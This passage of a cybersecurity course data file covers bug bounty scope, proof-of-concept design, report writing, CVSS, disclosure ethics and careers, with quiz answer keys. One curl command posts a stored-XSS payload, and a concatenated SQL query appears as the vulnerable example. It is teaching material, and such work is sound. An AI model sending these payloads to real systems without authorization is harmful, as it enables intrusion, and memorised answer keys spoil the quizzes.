          question: 'Which open-source framework developed by Red Canary allows defenders to run simple, scripted tests mapped to MITRE ATT&CK techniques to test their detection sensors?',
          options: ['Atomic Red Team', 'Hydra', 'John the Ripper', 'Cisco Packet Tracer'],
          correctAnswerIndex: 0,
          explanation: 'Atomic Red Team provides library-based, portable tests mapped to MITRE ATT&CK techniques, allowing defenders to verify that their detection rules work as expected.'
        }
      }
    ]
  },
  {
    id: 12,
    title: 'Bug Bounty & Report Writing',
    description: 'Learn ethical vulnerability disclosure, bug bounty platforms, CVSS calculators, proof-of-concept creation, and executive reporting.',
    level: 'intermediate',
    badge: 'Phase 12',
    lessons: [
      {
        id: 'bounty-101',
        title: 'Bug Bounty Platforms, Program Policies & Scope Adherence',
        estimatedMinutes: 30,
        difficulty: 'beginner',
        prerequisites: ['web-101'],
        theory: 'Bug Bounty programs incentivize independent security researchers to discover and ethically report vulnerabilities in organizations in exchange for recognition and monetary rewards (bounties). Platforms like HackerOne, Bugcrowd, and Intigriti host programs. Every program defines a strict Policy: In-Scope targets (specific domains, mobile apps), Out-of-Scope targets (third-party services, DDoS, social engineering), safe harbor protections, and disclosure rules (private vs. coordinated disclosure).',
        steps: [
          'Review the difference between Public, Private, and Vulnerability Disclosure Programs (VDP).',
          'Read and dissect a program policy document: identify in-scope wildcards (`*.example.com`) and excluded subdomains.',
          'Understand Safe Harbor clauses protecting security researchers acting in good faith from legal prosecution.',
          'Configure dedicated testing headers (e.g. `X-Bug-Bounty: researcher_username`) to identify authorized test traffic.'
        ],
        commands: [
          {
            command: 'curl -H "X-Bug-Bounty: hacker_alice" https://target.com/api',
            explanation: 'Send HTTP request with custom identifying bounty header specified in program policy.'
          }
        ],
        practicalExample: 'A researcher discovers a severe SQLi on `careers-portal.target.com`. However, the program policy explicitly marks `careers-portal` as Out-of-Scope because it is hosted by an unowned third-party vendor. Submitting this bug will be closed as "Out of Scope" with zero bounty.',
        exercise: 'Explain the difference between a paid Bug Bounty Program and an unpaid Vulnerability Disclosure Program (VDP).',
        expectedResult: 'A Bug Bounty program offers monetary compensation for valid security findings; a VDP provides a legal communication channel and safe harbor to report flaws for recognition/swag without financial bounties.',
        knowledgeCheck: {
          question: 'What is the consequence of testing an asset that is explicitly marked as "Out of Scope" in a bug bounty program policy?',
          options: [
            'You receive a double bounty',
            'You violate program terms, forfeit any reward, risk platform ban, and lose legal Safe Harbor protection',
            'The asset is automatically added to scope',
            'Nothing happens'
          ],
          correctAnswerIndex: 1,
          explanation: 'Testing out-of-scope systems is strictly prohibited, forfeits legal protections under Safe Harbor, and can lead to account suspension or criminal liability.'
        }
      },
      {
        id: 'bounty-102',
        title: 'Effective Proof of Concept (PoC) Development',
        estimatedMinutes: 35,
        difficulty: 'intermediate',
        prerequisites: ['bounty-101', 'web-102', 'web-103'],
        theory: 'A Proof of Concept (PoC) demonstrates the existence, exploitability, and realistic impact of a vulnerability without causing unnecessary harm or service disruption. High-quality PoCs use non-destructive payloads: for XSS, pop an alert box displaying `document.domain`; for SSRF, query a non-destructive collaborator URL or `127.0.0.1` echo endpoint; for SQLi, extract the database version (`SELECT @@version`). Never delete data, download sensitive mass customer records, or disrupt services.',
        steps: [
          'Design non-destructive, repeatable proof-of-concept steps.',
          'Capture clean, unedited HTTP request and response raw text.',
          'Provide automated reproduction scripts using curl or Python requests.',
          'Include video recordings or clear annotated screenshots for complex multi-step UI vulnerabilities.'
        ],
        commands: [
          {
            command: 'curl -i -s -k -X POST "https://target.local/api/profile" -H "Content-Type: application/json" -d \'{"username": "<img src=x onerror=alert(document.domain)>"}\'',
            explanation: 'Construct a self-contained, reproducible curl command demonstrating Stored XSS.'
          }
        ],
        practicalExample: 'When finding an IDOR vulnerability allowing access to private user documents, download only one sample document belonging to a secondary test account you own. Do NOT download all 50,000 documents to prove the bug.',
        exercise: 'Explain why ethical hackers use `alert(document.domain)` instead of generic `alert(1)` in professional XSS PoCs.',
        expectedResult: 'Displaying `document.domain` conclusively proves to the triager that the script is executing in the context of the target\'s origin and not an isolated sandbox or iframe.',
        knowledgeCheck: {
          question: 'What is the golden rule regarding data access when discovering an unauthorized data disclosure (IDOR / SQLi) in a bug bounty program?',
          options: [
            'Download the entire customer database and post it online',
            'Access the minimum amount of data necessary to prove the vulnerability (e.g. one sample record from your own test account) and stop immediately',
            'Sell the data on dark web forums',
            'Delete the database tables'
          ],
          correctAnswerIndex: 1,
          explanation: 'Demonstrating impact requires proving the vulnerability on a minimal sample. Accessing or exfiltrating mass customer records violates ethical and legal standards.'
        }
      },
      {
        id: 'bounty-103',
        title: 'Writing High-Impact Vulnerability Reports for Triagers',
        estimatedMinutes: 40,
        difficulty: 'intermediate',
        prerequisites: ['bounty-101', 'bounty-102'],
        theory: 'Bug bounty triagers review hundreds of reports daily. A poorly written report gets delayed, downgraded, or closed as "Informative". A well-structured report includes: Clear Title, Vulnerability Classification (CWE), Target Endpoint, CVSS Score with Vector String, Business Impact Summary, Step-by-Step Reproduction Instructions, Proof of Concept, and Specific Remediation Guidance. Clear writing translates directly to faster payouts and higher reputation.',
        steps: [
          'Draft an informative title following the pattern: `[Vulnerability Type] in [Endpoint/Component] leads to [Business Impact]`.',
          'Write a compelling Business Impact section explaining what an adversary achieves in business terms (e.g., account takeover, financial fraud).',
          'Format reproduction steps as a numbered, unambiguous checklist that any developer can follow in 2 minutes.',
          'Provide exact code recommendations or configuration snippets for remediation.'
        ],
        commands: [
          {
            command: 'cat bug_report_template.md',
            explanation: 'Inspect standard structured Markdown bug report template.'
          }
        ],
        practicalExample: 'Bad Title: "Bug in website". Good Title: "Stored XSS in User Profile Biography via Unsanitized Input allows Stored Account Takeover via Session Hijacking".',
        exercise: 'Draft the Title and Impact statement for a vulnerability where any user can reset other users\' passwords due to a missing authentication token check in `/api/password-reset`.',
        expectedResult: 'Title: Broken Authentication in /api/password-reset Allows Full Account Takeover; Impact: Any unauthenticated attacker can reset passwords for arbitrary user accounts without authorization.',
        knowledgeCheck: {
          question: 'Which of the following report titles is best suited for quick triaging on bug bounty platforms?',
          options: [
            'Critical Bug Found Please Check Fast!!',
            'IDOR in /api/v1/invoices allows unauthenticated download of customer billing statements',
            'Hacked your database pay me bounty',
            'Website issue'
          ],
          correctAnswerIndex: 1,
          explanation: 'Option B clearly states the vulnerability type (IDOR), affected endpoint (`/api/v1/invoices`), and specific business impact (customer statement disclosure).'
        }
      },
      {
        id: 'bounty-104',
        title: 'CVSS Vector Calculation & Severity Negotiation',
        estimatedMinutes: 35,
        difficulty: 'intermediate',
        prerequisites: ['vuln-101', 'bounty-103'],
        theory: 'Bounty rewards are directly tied to CVSS severity (Low, Medium, High, Critical). Disagreements between researchers and triagers frequently occur over CVSS metric selections: Attack Vector (Network vs. Local), Privileges Required (None vs. Low), User Interaction (None vs. Required), and Scope (Unchanged vs. Changed). Being able to defend a CVSS vector with technical accuracy ensures fair severity grading and reward distribution.',
        steps: [
          'Master CVSS v3.1 Base Metrics: AV (N/A/L/P), AC (L/H), PR (N/L/H), UI (N/R), S (U/C), C (N/L/H), I (N/L/H), A (N/L/H).',
          'Understand Scope Changed (S:C): occurs when vulnerability in one software component impacts resources managed by a different authority (e.g. Stored XSS impacting browser origin).',
          'Construct factual technical arguments referencing official FIRST.org CVSS documentation.',
          'Maintain professional, respectful communication during severity negotiations.'
        ],
        commands: [
          {
            command: 'cvss-calculator "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"',
            explanation: 'Calculate qualitative severity and numerical score from CVSS v3.1 vector string.'
          }
        ],
        practicalExample: 'A triager rates an XSS as Medium with Scope Unchanged. The researcher politely explains: "Per FIRST.org CVSS v3.1 specification section 2.2, XSS involves a Scope Change (S:C) because the vulnerable component is the web server, but the impacted component is the victim user\'s browser environment," increasing score to High.',
        exercise: 'Determine the CVSS score category for vector `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`.',
        expectedResult: 'Numerical score 9.8, rated as Critical severity.',
        knowledgeCheck: {
          question: 'In CVSS v3.1 scoring, what does a metric of `Scope: Changed (S:C)` indicate?',
          options: [
            'The company changed its corporate name',
            'The vulnerable component impacts resources beyond its own authorization boundary, affecting a separate security authority',
            'The bug bounty program changed its scope',
            'The tester changed their IP address'
          ],
          correctAnswerIndex: 1,
          explanation: 'Scope Changed occurs when an exploited vulnerability impacts privileges or components outside the vulnerable entity\'s security perimeter (classic example: XSS affecting victim browser).'
        }
      },
      {
        id: 'bounty-105',
        title: 'Executive Summaries & Translating Technical Risk for Leadership',
        estimatedMinutes: 35,
        difficulty: 'intermediate',
        prerequisites: ['bounty-103'],
        theory: 'C-suite executives (CISO, CTO, CEO) and board members do not read raw packet dumps, stack traces, or terminal output. An Executive Summary translates deep technical security findings into business risks: financial loss, regulatory penalties (GDPR, HIPAA, PCI-DSS), brand reputation damage, and customer churn. Writing executive summaries is a crucial skill for senior penetration testers and security consultants.',
        steps: [
          'Structure an Executive Summary: 1) Engagement Overview, 2) Overall Security Posture Rating, 3) High-Level Critical Findings, 4) Strategic Business Risk, 5) Prioritized Recommendations.',
          'Eliminate technical jargon (avoid "stack buffer overflow", write "flaw allowing unauthorized remote takeover").',
          'Incorporate visual risk matrices and severity pie charts.',
          'Connect technical remediations to business outcomes (e.g., compliance certification, avoiding downtime).'
        ],
        commands: [
          {
            command: 'cat executive_summary_sample.md',
            explanation: 'Review executive-level cybersecurity posture briefing document.'
          }
        ],
        practicalExample: 'Technical finding: "Remote Code Execution via unauthenticated deserialization in billing daemon". Executive translation: "A critical vulnerability on the payment server allows external actors to take full control, potentially halting transactions and risking $2.4M in regulatory fines under PCI-DSS."',
        exercise: 'Rewrite the technical finding "Missing HSTS and weak TLS 1.0 ciphers on public login portal" into one business-oriented executive sentence.',
        expectedResult: 'Outdated cryptographic protocols on the customer login page expose user credentials to interception on public Wi-Fi networks and fail modern industry compliance requirements.',
        knowledgeCheck: {
          question: 'What is the primary objective of an Executive Summary in a professional penetration testing report?',
          options: [
            'To provide step-by-step curl commands for debugging',
            'To communicate security posture, business risks, financial/regulatory impact, and strategic recommendations clearly to non-technical leadership and stakeholders',
            'To list every software package installed on the server',
            'To fill pages to make the report look longer'
          ],
          correctAnswerIndex: 1,
          explanation: 'Executives need to understand risk, business impact, and strategic investment priorities without getting bogged down in low-level command syntax.'
        }
      },
      {
        id: 'bounty-106',
        title: 'Professional Penetration Testing Report Architecture',
        estimatedMinutes: 45,
        difficulty: 'intermediate',
        prerequisites: ['bounty-103', 'bounty-105'],
        theory: 'A Penetration Testing Report is the primary deliverable of a commercial security assessment. Professional report structure: 1) Document Control (confidentiality notice, revision history), 2) Executive Summary, 3) Scope and Methodology (PTES, dates, tested IPs), 4) Posture Summary & Risk Matrix, 5) Detailed Technical Findings (Title, Severity, CVSS, Systems, Description, Reproduction, Proof of Concept, Remediation), and 6) Appendices (tools used, raw scan data).',
        steps: [
          'Assemble standard sections of a commercial penetration testing report.',
          'Format finding entries with consistent metadata headers and clear typography.',
          'Sanitize sensitive information (blur out customer PII, real credit card numbers, or live private keys in screenshots).',
          'Maintain report confidentiality: encrypt report PDF with AES-256 before delivery to clients.'
        ],
        commands: [
          {
            command: 'pandoc report.md -o Cyber_Assessment_Report.pdf --toc --highlight-style tango',
            explanation: 'Compile structured Markdown assessment findings into a formal client PDF report.'
          }
        ],
        practicalExample: 'A client receives a 40-page penetration report with a clean executive summary, clear risk breakdown charts, and detailed developer fix instructions, allowing immediate remediation and audit sign-off.',
        exercise: 'List the seven core attributes every individual finding must have in the Detailed Findings section.',
        expectedResult: 'Finding Title, Severity Rating, CVSS Vector String, Affected Host/URL, Description & Impact, Step-by-Step Reproduction (PoC), and Detailed Remediation.',
        knowledgeCheck: {
          question: 'What must an assessor do before including screenshots of database queries or customer records in a client report?',
          options: [
            'Post them on social media',
            'Carefully redact or blur sensitive customer Personally Identifiable Information (PII), credentials, and financial details',
            'Delete the screenshots entirely',
            'Invert the screenshot colors'
          ],
          correctAnswerIndex: 1,
          explanation: 'Reports must adhere to privacy standards; PII and sensitive credentials must be redacted to prevent further data exposure.'
        }
      },
      {
        id: 'bounty-107',
        title: 'Actionable Remediation Guidance & Secure Coding Patterns',
        estimatedMinutes: 40,
        difficulty: 'intermediate',
        prerequisites: ['web-102', 'web-103', 'bounty-106'],
        theory: 'Reporting a vulnerability without providing an actionable fix is only half the job. Vulnerability reports must deliver concrete, framework-specific remediation guidance rather than generic advice like "validate input". For SQLi, provide parameterized query examples in the client\'s specific language (e.g. Python SQLAlchemy or Node.js Prisma); for XSS, demonstrate context-aware output encoding or React JSX escaping; for SSRF, supply IP allowlisting logic.',
        steps: [
          'Differentiate generic advice ("fix the bug") from actionable technical remediation (code snippets, config settings).',
          'Provide short-term mitigations (WAF rules, disabling dangerous features) alongside permanent architectural fixes.',
          'Reference authoritative industry standards: OWASP Cheat Sheet Series, NIST, CIS Benchmarks.',
          'Verify code fixes with regression testing test cases.'
        ],
        commands: [
          {
            command: 'cat remediation_guide.md',
            explanation: 'Review developer remediation instructions and secure code comparison.'
          }
        ],
        practicalExample: 'Instead of writing "Sanitize input for SQL injection", the report provides: "Replace `db.query(\'SELECT * FROM users WHERE id=\' + req.body.id)` with parameterized prepared statement: `db.query(\'SELECT * FROM users WHERE id = $1\', [req.body.id])`."',
        exercise: 'Draft actionable remediation guidance for an Insecure Direct Object Reference (IDOR) on an invoice download endpoint.',
        expectedResult: 'Verify in the database query that the requested invoice belongs to the authenticated user ID stored in the current session token: `WHERE invoice_id = ? AND user_id = session.user_id`.',
        knowledgeCheck: {
          question: 'What makes remediation guidance in a security report truly "actionable" for a developer?',
          options: [
            'Writing in all capital letters',
            'Providing specific, framework-appropriate code snippets, configuration directives, and references to authoritative secure coding standards',
            'Telling them to hire new developers',
            'Refusing to explain the issue'
          ],
          correctAnswerIndex: 1,
          explanation: 'Developers need precise code modifications and architectural instructions tailored to their technology stack to implement fixes correctly.'
        }
      },
      {
        id: 'bounty-108',
        title: 'Coordinated Vulnerability Disclosure (CVD) & Bug Bounty Ethics',
        estimatedMinutes: 35,
        difficulty: 'beginner',
        prerequisites: ['bounty-101'],
        theory: 'Coordinated Vulnerability Disclosure (CVD / ISO 29147) balances public safety with transparency. The researcher notifies the vendor privately, giving them a reasonable remediation window (typically 90 days per industry standard, e.g., Google Project Zero) before disclosing technical details publicly. Full Disclosure (releasing zero-day exploits publicly without vendor notice) puts users at extreme risk. Non-disclosure agreements (NDAs) in private bounty programs legally prohibit any unauthorized disclosure.',
        steps: [
          'Understand the ISO/IEC 29147 vulnerability disclosure standard.',
          'Review the standard 90-day disclosure timeline and policy extensions for complex remediations.',
          'Follow proper protocols if a vendor is unresponsive: reach out via `security.txt`, CERT/CC, or national CSIRTs.',
          'Publish sanitized write-ups post-remediation after receiving mutual vendor confirmation.'
        ],
        commands: [
          {
            command: 'curl -s https://example.com/.well-known/security.txt',
            explanation: 'Query the standardized security.txt file to identify an organization\'s official security contact and encryption key.'
          }
        ],
        practicalExample: 'A researcher discovers a zero-day in open-source software. They submit the bug via security.txt contact, wait 60 days while the vendor develops and releases a patched version, and only then publish a defensive educational write-up.',
        exercise: 'Explain the role of the `/.well-known/security.txt` standard file on websites.',
        expectedResult: 'It provides a standardized location for web properties to declare security contacts, encryption keys, hiring notices, and disclosure policy URLs.',
        knowledgeCheck: {
          question: 'What is the standard disclosure window established by major industry research teams (such as Google Project Zero) before public disclosure?',
          options: ['24 hours', '90 days', '5 years', '10 minutes'],
          correctAnswerIndex: 1,
          explanation: '90 days is the widely accepted industry standard, granting vendors sufficient time to develop, test, and deploy security patches before public disclosure.'
        }
      },
      {
        id: 'bounty-109',
        title: 'Building a Hacker Portfolio & Writing Educational Write-ups',
        estimatedMinutes: 35,
        difficulty: 'beginner',
        prerequisites: ['bounty-101', 'bounty-103'],
        theory: 'A strong cybersecurity career is built on demonstrable skills, clear technical writing, and active community contributions. Writing high-quality educational write-ups of retired CTF challenges, disclosed bug bounty reports, and novel research demonstrates technical depth, communication ability, and ethical discipline. An online portfolio (GitHub, personal blog, HackerOne public profile) serves as living proof of expertise for prospective employers and clients.',
        steps: [
          'Select interesting retired lab challenges or disclosed vulnerabilities with permission.',
          'Structure write-ups: Introduction, Target Overview, Enumeration, Initial Foothold, Privilege Escalation, Key Takeaways & Defense.',
          'Explain the thought process, failed attempts, and reasoning, not just the final winning command.',
          'Publish reproducible code and automation tools on GitHub with clear documentation.'
        ],
        commands: [
          {
            command: 'git log --oneline -n 5',
            explanation: 'Review clean, descriptive commit history in security research repository.'
          }
        ],
        practicalExample: 'An entry-level candidate secures a penetration testing position because their blog contains five in-depth, original write-ups dissecting Active Directory attack paths and explaining exact defensive remediations.',
        exercise: 'Explain why documenting "failed attempts and rabbit holes" improves the educational value of a write-up.',
        expectedResult: 'It teaches readers how to diagnose errors, eliminate hypotheses, and think like a real investigator rather than following a sterile script.',
        knowledgeCheck: {
          question: 'When is it legally and ethically permissible to publish a write-up detailing a vulnerability found in a bug bounty program?',
          options: [
            'Immediately after finding it',
            'Only after the vulnerability has been fully resolved by the vendor AND explicit permission or coordinated disclosure approval has been granted in accordance with program policy',
            'Whenever you want',
            'Only if you were not paid'
          ],
          correctAnswerIndex: 1,
          explanation: 'Publishing without vendor fix and explicit consent violates program rules, exposes users to active exploits, and invalidates safe harbor protections.'
        }
      },
      {
        id: 'bounty-110',
        title: 'Cybersecurity Career Pathways & Continuous Learning Roadmap',
        estimatedMinutes: 40,
        difficulty: 'beginner',
        prerequisites: ['pentest-101', 'dfir-101', 'soc-101', 'bounty-101'],
        theory: 'Cybersecurity encompasses diverse career specializations: Penetration Testing / Red Teaming, Security Operations (SOC) & Blue Teaming, Digital Forensics & Incident Response (DFIR), Application Security (AppSec), Cloud Security, Threat Intelligence, and Governance, Risk & Compliance (GRC). Professional certifications (CompTIA Security+, eJPT, OSCP, CISSP, BTL1) validate hands-on competencies. Continuous lifelong learning is mandatory in this rapidly evolving threat landscape.',
        steps: [
          'Assess personal strengths: Offensive Hacking vs. Defensive Analysis vs. Cloud Architecture vs. Forensic Investigation.',
          'Map out certification pathways: Foundations (Security+, Network+) -> Intermediate (eJPT, BTL1, CEH) -> Advanced (OSCP, PNPT, CISSP).',
          'Engage with cybersecurity communities: CTF competitions, DEF CON groups, OWASP local chapters, BSides conferences.',
          'Establish a daily threat intelligence reading routine (BleepingComputer, KrebsOnSecurity, The Hacker News, CISA Advisories).'
        ],
        commands: [
          {
            command: 'curl -s https://feeds.feedburner.com/TheHackersNews | grep -o "<title>[^<]*" | head -n 10',
            explanation: 'Review the latest top cybersecurity news headlines and emerging threat advisories.'
          }
        ],
        practicalExample: 'An analyst creates a six-month roadmap: completes Linux & Networking foundations, builds a home lab with Suricata and Wazuh, practices on HackTheBox, earns eJPT certification, and transitions into a junior penetration testing role.',
        exercise: 'Identify the certification widely recognized as the hands-on standard for technical penetration testing capability.',
        expectedResult: 'OffSec Certified Professional (OSCP).',
        knowledgeCheck: {
          question: 'What is the most critical mindset requirement for long-term success in cybersecurity engineering?',
          options: [
            'Memorizing static tools without understanding underlying protocols',
            'Curiosity, ethical integrity, a deep commitment to continuous hands-on learning, and understanding foundational system fundamentals',
            'Downloading pre-built automated scripts',
            'Only working with Windows'
          ],
          correctAnswerIndex: 1,
          explanation: 'Technology and attack techniques evolve constantly; curiosity, ethical discipline, and strong fundamentals allow professionals to adapt to new security paradigms.'
        }
      }
    ]
  }
];
